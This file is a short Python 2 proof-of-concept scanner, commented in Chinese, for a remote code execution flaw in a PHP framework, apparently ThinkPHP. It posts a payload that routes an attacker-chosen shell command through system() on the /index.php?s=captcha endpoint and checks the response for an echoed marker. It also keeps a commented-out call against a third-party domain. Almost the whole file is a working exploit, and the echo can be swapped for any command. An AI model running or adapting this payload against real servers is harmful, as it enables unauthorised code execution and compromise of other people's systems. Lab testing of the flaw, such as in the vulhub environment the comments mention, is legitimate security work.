# coding:utf-8

import requests 
from urlparse import urlparse
import chardet

"""
远程代码执行漏洞，vulhub有测试环境
这个漏洞的利用需要服务端开启debug模式

必须要有header "Content-Type":"application/x-www-form-urlencoded"
否则会返回404
"""

def scan(url):
    url_parse = urlparse(url)
    url = url_parse.scheme + "://" + url_parse.netloc + "/index.php?s=captcha"
    data = {"_method":"__construct",
            "filter[]":"system",
            "method":"get",
            "server[REQUEST_METHOD]":"echo google_hacker_est_V13"}
    headers = {"Content-Type":"application/x-www-form-urlencoded",
                "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:84.0) Gecko/20100101 Firefox/84.0",
                "Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Connection":"close"}
    try:
        res = requests.post(url,data=data,headers=headers)
        res.encoding = "utf-8"
        # _encoding = chardet.detect(res.text)[encoding]
        res_text = res.text.encode("utf-8")
        if "google_hacker_est_V13" in res_text:
            return True
        else:
            # print url
            # print res_text
            return False
    except requests.exceptions.ConnectionError as e:
        _un_reach = url +" |!_!| " + str(e)
        return _un_reach

if __name__ == "__main__":
    # scan("http://322.forgood.net/ThinkPHP/Lang/")
    scan("http://127.0.0.1:8080/")